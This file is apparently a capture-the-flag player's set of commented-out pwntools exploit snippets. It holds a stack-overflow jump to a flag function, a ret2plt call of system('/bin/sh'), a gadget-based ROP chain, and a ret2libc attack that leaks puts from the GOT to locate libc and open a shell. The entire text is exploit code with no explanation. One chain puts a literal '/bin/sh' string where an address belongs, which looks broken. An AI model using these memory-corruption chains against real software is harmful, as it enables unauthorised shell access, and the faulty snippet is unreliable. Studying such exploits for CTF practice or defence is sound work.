
# io = start()
# payload = cyclic(140) + pack(0xdeadbeef) + b'A'*4 + pack(elf.sym.printflag)
# io.sendline(payload)
# io.interactive()

# io = start()
# io.sendline(b'/bin/sh')
# inputaddr = 0x804a06c
# payload = b'A' * (16 + 4) + pack(elf.plt.system) + b'C' * 4 + pack(inputaddr)
# io.sendline(payload) 
# io.interactive()

# io = start()
# pop_rdi_ret = 0x400723
# pop_rsi_ret = 0x4006b8
# keyaddr = 0x601058
# payload = cyclic(16 + 8) + pack(pop_rdi_ret) + b'/bin/sh\x00' + pack(pop_rsi_ret) + pack(1) + pack(elf.sym.useme) + pack(pop_rdi_ret) + pack(keyaddr) + pack(elf.plt.system)
# io.sendline(payload)
# io.interactive()

# io = start()
# libc = ELF('../sctf/libc.so.6')

# rop = ROP(elf)
# rop.puts(elf.got.puts)
# rop.bofme()
# payload = cyclic(32 + 8) + rop.chain()
# io.sendline(payload)
# io.recvline()
# leak_address = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
# libc.address = leak_address - libc.sym.puts
# binsh = next(libc.search(b'/bin/sh\x00'))

# rop = ROP(libc)
# rop.raw(rop.ret)
# rop.system(binsh)
# payload = cyclic(32 + 8) + rop.chain()
# io.sendline(payload)
# io.interactive()
